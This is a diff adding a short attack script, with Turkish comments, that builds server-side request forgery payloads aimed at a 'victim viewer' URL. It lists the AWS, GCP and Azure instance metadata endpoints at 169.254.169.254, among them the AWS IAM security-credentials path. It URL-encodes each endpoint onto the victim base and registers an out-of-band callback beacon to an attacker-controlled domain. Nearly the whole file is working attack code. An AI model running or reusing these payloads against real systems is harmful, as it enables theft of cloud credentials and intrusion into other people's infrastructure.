@@ -1,0 +1,34 @@
+# Vars: base (victim viewer), oast, token
+let t = token ?? "0"
+let b = oast_beacon sub=t domain=oast path="/fluxion/cloudmeta" q={ tool:"fluxion" }
+
+let aws = [
+  "http://169.254.169.254/",
+  "http://169.254.169.254/latest/meta-data/",
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+]
+let gcp = [
+  "http://169.254.169.254/computeMetadata/v1/",
+  "http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true"
+]
+let az  = [
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
+]
+
+# Victim’e takılacak payload listesi
+let all = aws + gcp + az
+let payloads = all |> map(fn(u){ return join(base, url_encode(u)) })
+let u = at(az, 1)  # eskiden xs[1] idi
+
+echo value=jsonify({
+  beacon: b,
+  aws: aws, gcp: gcp, az: az,
+  all: all,
+  payloads: payloads,
+  u: u,
+  counts: { aws: len(aws), gcp: len(gcp), azure: len(az), total: len(all) },
+  sample: first(payloads)
+})
+
+return len(all)
